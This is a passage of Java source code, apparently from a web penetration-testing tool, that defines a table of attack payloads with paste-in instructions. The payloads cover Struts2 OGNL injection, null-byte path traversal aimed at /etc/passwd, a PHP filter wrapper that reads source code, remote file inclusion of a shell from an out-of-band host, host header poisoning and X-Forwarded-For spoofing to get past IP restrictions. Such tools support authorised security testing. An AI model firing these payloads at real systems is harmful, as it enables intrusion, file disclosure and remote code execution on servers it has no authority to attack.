                        "OGNL injection for Apache Struts2 apps. Paste in parameter values."},

                // File inclusion probes
                {"lfi_null", "LFI with null byte",
                        "....//....//....//etc/passwd%00",
                        "Path traversal with null byte terminator. Use as filename or path parameter."},

                {"lfi_wrapper", "PHP wrapper LFI",
                        "php://filter/convert.base64-encode/resource=index.php",
                        "PHP stream wrapper to read source code. Paste as file/page parameter."},

                {"rfi_probe", "Remote File Include",
                        oob + "/shell.txt%00",
                        "Remote file inclusion. Paste in include/require parameter values."},

                // Header-based payloads
                {"host_header", "Host header injection",
                        oob,
                        "Replace Host header value. Tests for host header injection / password reset poisoning."},

                {"xff_ssrf", "X-Forwarded-For SSRF",
                        "127.0.0.1",
                        "Set as X-Forwarded-For header. May bypass IP-based access controls."},
        };
    }
}
